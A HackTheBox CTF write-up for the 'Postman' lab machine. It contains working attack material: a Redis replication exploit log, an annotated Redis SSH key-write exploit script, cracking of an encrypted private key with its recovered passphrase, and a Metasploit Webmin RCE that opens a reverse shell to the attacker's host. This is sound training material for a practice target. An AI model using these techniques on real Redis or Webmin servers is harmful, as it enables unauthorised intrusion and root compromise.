---
title: "HackTheBox Writeup: Postman"
date: 2020-03-14T16:10:02+01:00
toc: true
showdate: true
tags:
  - hackthebox
  - ctf
  - writeup
---

First blog post in a few months, what better way to celebrate than to make a writeup for an easy Linux challenge from HackTheBox? Postman wasn't all too challenging but still introduced me to Redis, which is an interesting target I have added to my list of services to carefully enumerate from now on. Other than that the box is very straightforward, with a public Webmin exploit granting access to root.

![img](/images/writeup-postman/1.png)

---

## Enumeration

A thorough scan of the target only reveals SSH, HTTP, and something I have never seen up to this point, a Redis server:

```nmap
baud@kali:~/HTB/postman$ sudo nmap -sV -sC -p- -T4 -oA nmap 10.10.10.160
[sudo] password di baud: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 22:43 CET
Nmap scan report for 10.10.10.160
Host is up (0.051s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.77 seconds
```

As the service information given by nmap suggests Redis is a key-value kind of database, but more on that later. First the web server on port 80, which looks pretty standard:

![img](/images/writeup-postman/2.png)

Webmin on port 10000 can only be accessed via HTTPS:

![img](/images/writeup-postman/3.png)

And it turns out to be an untouched installation where username and password are not easily guessable:

![img](/images/writeup-postman/4.png)

Fuzzing for hidden folders and files does not return any interesting results, robots.txt does not exist. The only thing left to check is Redis.

---

## Playing around with Redis

By [Googling a bit](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) I learned that there are a few attacks that can be launched against Redis servers, one of them relies on a feature of the program itself, the: [master-slave replication](https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0).

This attack works by importing a custom Redis module written by the attacker into the victim server through the replication functionality, however the attack does not work on this target because this specific version of Redis was not compiled with module support and therefore does not recognize the MODULE command:

```aaa
baud@kali:~/redis-rogue-server$ python3 redis-rogue-server.py --rhost 10.10.10.160 --rport 6379 --lhost 10.10.14.144 --lport 6379
TARGET 10.10.10.160:6379
SERVER 10.10.14.144:6379
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$12\r\n10.10.14.144\r\n$4\r\n6379\r\n'
[->] b'+OK\r\n'
[<-] b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
[->] b'+OK\r\n'
[->] b'PING\r\n'
[<-] b'+PONG\r\n'
[->] b'REPLCONF listening-port 6379\r\n'
[<-] b'+OK\r\n'
[->] b'REPLCONF capa eof capa psync2\r\n'
[<-] b'+OK\r\n'
[->] b'PSYNC a4661f5ea401e8489637fe758778dd6e0e7e9eba 1\r\n'
[<-] b'+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 1\r\n$48560\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'......b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd9\xb6\x00\x00\x00\x00\x00\x00\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n'
[<-] b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
[->] b"-ERR unknown command 'MODULE'\r\n"
[<-] b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
[->] b'+OK\r\n'
[<<] 
```

A redis-info nmap script exists but it does not return much useful info:

```aaa
baud@kali:~/HTB/postman$ nmap --script redis-info -sV -p 6379 10.10.10.160
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-29 14:42 CET
Nmap scan report for 10.10.10.160
Host is up (0.040s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)
| redis-info: 
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 596
|   Used CPU (sys): 48.53
|   Used CPU (user): 17.14
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 820.52K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|_    10.10.14.144

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
```

At this point I started doing some manual enumeration with the redis-cli utility included in the redis package. After connecting to the host the "info" command can be issued to obtain some details on the host itself, like operating system version and architecture, some file paths, and hardware information, overall not too interesting:

```aaa
baud@kali:~/HTB/postman$ redis-cli -h 10.10.10.160
10.10.10.160:6379> info
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-58-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:596
run_id:863315324c72277490df7348164c7a600e8d9faf
tcp_port:6379
uptime_in_seconds:57847
uptime_in_days:0
hz:10
lru_clock:5925790
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:840216
used_memory_human:820.52K
used_memory_rss:2887680
used_memory_rss_human:2.75M
used_memory_peak:881960
used_memory_peak_human:861.29K
used_memory_peak_perc:95.27%
used_memory_overhead:832086
used_memory_startup:782456
used_memory_dataset:8130
used_memory_dataset_perc:14.08%
total_system_memory:941203456
total_system_memory_human:897.60M
used_memory_lua:37888
used_memory_lua_human:37.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:3.44
mem_allocator:jemalloc-3.6.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1582928856
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:29
total_commands_processed:36
instantaneous_ops_per_sec:0
total_net_input_bytes:99215
total_net_output_bytes:32147
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:6fa8232479647e17ee7bc9439667dc6aa6331173
master_replid2:a4661f5ea401e8489637fe758778dd6e0e7e9eba
master_repl_offset:0
second_repl_offset:1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:48.74
used_cpu_user:17.19
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Cluster
cluster_enabled:0

# Keyspace
10.10.10.160:6379>
```

It is possible though to get the server's configuration with the *config get* command, and this returns a series of keys and their values, taken from the Redis configuration file:

```aaa
10.10.10.160:6379> config get *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "cluster-announce-ip"
  8) ""
  9) "unixsocket"
 10) ""
 11) "logfile"
 12) "/var/log/redis/redis-server.log"
 13) "pidfile"
 14) "/var/run/redis/redis-server.pid"
 15) "slave-announce-ip"
 16) ""
 17) "maxmemory"
 18) "0"
 19) "proto-max-bulk-len"
 20) "536870912"
 21) "client-query-buffer-limit"
 22) "1073741824"
 23) "maxmemory-samples"
 24) "5"
 25) "lfu-log-factor"
 26) "10"
 27) "lfu-decay-time"
 28) "1"
 29) "timeout"
 30) "0"
 31) "active-defrag-threshold-lower"
 32) "10"
 33) "active-defrag-threshold-upper"
 34) "100"
 35) "active-defrag-ignore-bytes"
 36) "104857600"
 37) "active-defrag-cycle-min"
 38) "25"
 39) "active-defrag-cycle-max"
 40) "75"
 41) "auto-aof-rewrite-percentage"
 42) "100"
 43) "auto-aof-rewrite-min-size"
 44) "67108864"
 45) "hash-max-ziplist-entries"
 46) "512"
 47) "hash-max-ziplist-value"
 48) "64"
 49) "list-max-ziplist-size"
 50) "-2"
 51) "list-compress-depth"
 52) "0"
 53) "set-max-intset-entries"
 54) "512"
 55) "zset-max-ziplist-entries"
 56) "128"
 57) "zset-max-ziplist-value"
 58) "64"
 59) "hll-sparse-max-bytes"
 60) "3000"
 61) "lua-time-limit"
 62) "5000"
 63) "slowlog-log-slower-than"
 64) "10000"
 65) "latency-monitor-threshold"
 66) "0"
 67) "slowlog-max-len"
 68) "128"
 69) "port"
 70) "6379"
 71) "cluster-announce-port"
 72) "0"
 73) "cluster-announce-bus-port"
 74) "0"
 75) "tcp-backlog"
 76) "511"
 77) "databases"
 78) "16"
 79) "repl-ping-slave-period"
 80) "10"
 81) "repl-timeout"
 82) "60"
 83) "repl-backlog-size"
 84) "1048576"
 85) "repl-backlog-ttl"
 86) "3600"
 87) "maxclients"
 88) "10000"
 89) "watchdog-period"
 90) "0"
 91) "slave-priority"
 92) "100"
 93) "slave-announce-port"
 94) "0"
 95) "min-slaves-to-write"
 96) "0"
 97) "min-slaves-max-lag"
 98) "10"
 99) "hz"
100) "10"
101) "cluster-node-timeout"
102) "15000"
103) "cluster-migration-barrier"
104) "1"
105) "cluster-slave-validity-factor"
106) "10"
107) "repl-diskless-sync-delay"
108) "5"
109) "tcp-keepalive"
110) "300"
111) "cluster-require-full-coverage"
112) "yes"
113) "cluster-slave-no-failover"
114) "no"
115) "no-appendfsync-on-rewrite"
116) "no"
117) "slave-serve-stale-data"
118) "yes"
119) "slave-read-only"
120) "yes"
121) "stop-writes-on-bgsave-error"
122) "yes"
123) "daemonize"
124) "yes"
125) "rdbcompression"
126) "yes"
127) "rdbchecksum"
128) "yes"
129) "activerehashing"
130) "yes"
131) "activedefrag"
132) "no"
133) "protected-mode"
134) "no"
135) "repl-disable-tcp-nodelay"
136) "no"
137) "repl-diskless-sync"
138) "no"
139) "aof-rewrite-incremental-fsync"
140) "yes"
141) "aof-load-truncated"
142) "yes"
143) "aof-use-rdb-preamble"
144) "no"
145) "lazyfree-lazy-eviction"
146) "no"
147) "lazyfree-lazy-expire"
148) "no"
149) "lazyfree-lazy-server-del"
150) "no"
151) "slave-lazy-flush"
152) "no"
153) "maxmemory-policy"
154) "noeviction"
155) "loglevel"
156) "notice"
157) "supervised"
158) "no"
159) "appendfsync"
160) "everysec"
161) "syslog-facility"
162) "local0"
163) "appendonly"
164) "no"
165) "dir"
166) "/var/lib/redis"
167) "save"
168) "900 1 300 10 60 10000"
169) "client-output-buffer-limit"
170) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
171) "unixsocketperm"
172) "0"
173) "slaveof"
174) ""
175) "notify-keyspace-events"
176) ""
177) "bind"
178) "0.0.0.0 ::1"
10.10.10.160:6379>
```

The whole database can be dumped with the *keys* command but it appears to be empty:

```aaa
10.10.10.160:6379> keys *
(empty list or set)
10.10.10.160:6379>
```

---

## Exploitation: Unauthenticated SSH Key Write

Another [existing exploit](https://github.com/Avinash-acid/Redis-Server-Exploit) for Redis allows to get a SSH session as the user running the Redis service if the server isn't configured properly. This exploits the ability of an anonymous user to write data in the database as a key and then exporting the data as a file, writing arbitrary data on the disk within the Redis user's context. The SSH session is created by generating a pair of RSA keys and adding the public one to the Redis user's authorized keys.

I'm going to briefly examine how the exploit works here. First, the RSA keys are generated with ssh-keygen:

```python
print colored("\t SSH Keys Need to be Generated", 'blue')
os.system('ssh-keygen -t rsa -C \"acid_creative\"')
print colored("\t Keys Generated Successfully", "blue")
```

A text file is then created in the current local user's .ssh directory, containing the public RSA key with an empty line at the beginning and end of the file:

```python
os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
```

The exploit starts interacting with the target by connecting to it via the redis-cli utility and sending a "flushall" command:

```python
cmd = "redis-cli -h " + ip_address + ' flushall'
os.system(cmd)
```

We can consult the Redis help from redis-cli to find out that "flushall" clears the database from all keys:

```aaa
baud@kali:~/offsecdeer.gitlab.io$ redis-cli
Could not connect to Redis at 127.0.0.1:6379: Connection refused
not connected> help
redis-cli 5.0.7
To get help about Redis commands type:
      "help @<group>" to get a list of commands in <group>
      "help <command>" for help on <command>
      "help <tab>" to get a list of possible help topics
      "quit" to exit

To set redis-cli preferences:
      ":set hints" enable online hints
      ":set nohints" disable online hints
Set your preferences in ~/.redisclirc
not connected> help flushall

  FLUSHALL [ASYNC]
  summary: Remove all keys from all databases
  since: 1.0.0
  group: server
```

The cmd1 string will act as base string for all successive commands:

```python
cmd1 = "redis-cli -h " + ip_address
```

The public key is then copied inside a key of the database, it can have any name, in this case the exploit author chose "cracklist":

```python
cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h " +  ip_address + ' -x set cracklist'
os.system(cmd2)
```

A command to make a backup copy of the database is created, this is so that users can restore the empty database after exploitation to clear their tracks:

```python
cmd3 = cmd1 + ' config set dbfilename "backup.db" '
```

Finally the exploit is getting ready to export the database into a physical file, it specifies the destination directory and the file name, then issues the "save" command to dump the content of the database inside the directory where the Redis user keeps all its RSA keys for SSH login:

```python
cmd4 = cmd1 + ' config set  dir' + " /home/"+username+"/.ssh/"
cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
cmd6 = cmd1 + ' save'
```

The commands are executed in batch and a new function to connect to the host is executed:

```python
os.system(cmd3)
os.system(cmd4)
os.system(cmd5)
os.system(cmd6)
print colored("\tYou'll get shell in sometime..Thanks for your patience", "green")
ssh_connection()
```

The function simply launches *ssh* and connects to the server with the private RSA key paired with the public one that was written on the victim:

```python
def ssh_connection():
	shell = "ssh -i " + '$HOME/.ssh/id_rsa ' + username+"@"+ip_address
	os.system(shell)
```

Now, this exploit will not work right out of the box. The script assumes that the user running Redis has its own home folder with .ssh in /home/ like a normal user, however this is not the case here. A part of the output of the Redis configuration obtained earlier contains the home folder of the user, and it turns out to be inside /var/lib/redis/:

```aaa
165) "dir"
166) "/var/lib/redis"
```

So the hard coded path can be changed into:

```aaa
cmd3 = cmd1 + ' config set dbfilename "backup.db" '
cmd4 = cmd1 + ' config set  dir' + " /var/lib/redis/.ssh/"
cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
cmd6 = cmd1 + ' save'
```

And running the exploit will return a shell as the user redis:

```aaa
baud@kali:~/HTB/postman$ ./redis.py 10.10.10.160 redis
	*******************************************************************
	* [+] [Exploit] Exploiting misconfigured REDIS SERVER*
	* [+] AVINASH KUMAR THAPA aka "-Acid"                                
	*******************************************************************


	 SSH Keys Need to be Generated
Generating public/private rsa key pair.
Enter file in which to save the key (/home/baud/.ssh/id_rsa): 
/home/baud/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/baud/.ssh/id_rsa.
Your public key has been saved in /home/baud/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:kB6uf4d+j6mupWRy8fNTC1wO1b8d71kzGEATYCvWOaI acid_creative
The key's randomart image is:
+---[RSA 3072]----+
|         oo+..   |
|       .o o.o .  |
|      ++ = ..  . |
|     oooo o .. ..|
|     E+ S. +  o =|
|     . o  o o. ++|
|    o + +. o . .=|
|     * ooo+o.  ..|
|      +=+++o.    |
+----[SHA256]-----+
	 Keys Generated Successfully
OK
OK
OK
OK
OK
OK
	You'll get shell in sometime..Thanks for your patience
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$
```

---

## Privilege Escalation #1: Cracking Encrypted RSA Key

The bash_history file in the folder where I have landed reveals the existence of a user called Matt, a file called scan.py, and a backup RSA key id_rsa.bak:

```aaa
redis@Postman:~$ cat .bash_history 
exit
su Matt
pwd
nano scan.py
python scan.py
nano scan.py
clear
nano scan.py
clear
python scan.py
exit
exit
cat /etc/ssh/sshd_config 
su Matt
clear
cd /var/lib/redis
su Matt
exit
cat id_rsa.bak 
ls -la
exit
cat id_rsa.bak 
exit
ls -la
crontab -l
systemctl enable redis-server
redis-server
ifconfig
netstat -a
netstat -a
netstat -a
netstat -a
netstat -a > txt
exit
crontab -l
cd ~/
ls
nano 6379
exit
```

The id_rsa.bak file mentioned in the bash history is found in /opt and can be read by everyone:

```aaa
redis@Postman:/var$ find / -name id_rsa.bak 2>/dev/null
/opt/id_rsa.bak
redis@Postman:/var$ ls -la /opt/id_rsa.bak
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
```

The key is protected by a passphrase though:

```aaa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

John can be used to attempt a passphrase cracking by using the ssh2john utility to convert the private key into the right format first:

```aaa
baud@kali:~/HTB/postman$ /usr/share/john/ssh2john.py sshKey > forJohn
baud@kali:~/HTB/postman$ cat forJohn
sshKey:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63
```

And then the key is successfully cracked with the classic rockyou.txt dictionary:

```aaa
baud@kali:~/HTB/postman$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt forJohn
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (sshKey)
1g 0:00:00:25 DONE (2020-02-29 17:52) 0.03993g/s 572751p/s 572751c/s 572751C/sa6_123..*7¡Vamos!
Session completed
baud@kali:~/HTB/postman$ /usr/sbin/john --show forJohn
sshKey:computer2008

1 password hash cracked, 0 left
```

SSH accepts the key and passphrase but ends the connection straight away:

```aaa
baud@kali:~/HTB/postman$ chmod 600 sshKey 
baud@kali:~/HTB/postman$ ssh -i sshKey Matt@10.10.10.160
Enter passphrase for key 'sshKey': 
Connection closed by 10.10.10.160 port 22
```

However Matt is a lazy ass and used the same passphrase for his own account password:

```aaa
User: Matt
Pass: computer2008
```

So we can just use *su* to login as Matt from the existing SSH session as redis:

```aaa
redis@Postman:/var$ su Matt
Password: 
Matt@Postman:/var$
```

This allows us to grab the user flag. 

---

## Privilege Escalation #2: Webmin Package Update RCE Exploit

There's not much else we can access as Matt on the disk, but do you remember the Webmin portal found at the very beginning? Matt's credentials work there as well:

![img](/images/writeup-postman/5.png)

He has access to the software package updates feature:

![img](/images/writeup-postman/6.png)

For which exists an exploit for this same version:

```aaa
msf5 > use exploit/linux/http/webmin_packageup_rce
msf5 exploit(linux/http/webmin_packageup_rce) > show options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910


msf5 exploit(linux/http/webmin_packageup_rce) > set lhost 10.10.14.144
lhost => 10.10.14.144
msf5 exploit(linux/http/webmin_packageup_rce) > set password computer2008
password => computer2008
msf5 exploit(linux/http/webmin_packageup_rce) > set username Matt
username => Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set ssl true
ssl => true
msf5 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160
rhosts => 10.10.10.160
msf5 exploit(linux/http/webmin_packageup_rce) > run

[*] Started reverse TCP handler on 10.10.14.144:4444 
[+] Session cookie: 36ba18b7ab2ed0db97939090548f24d9
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.144:4444 -> 10.10.10.160:53590) at 2020-02-29 18:05:54 +0100

whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

The exploit grants a root shell because Webmin was running as the root user, which we could have seen from Matt's session by listing the running processes.






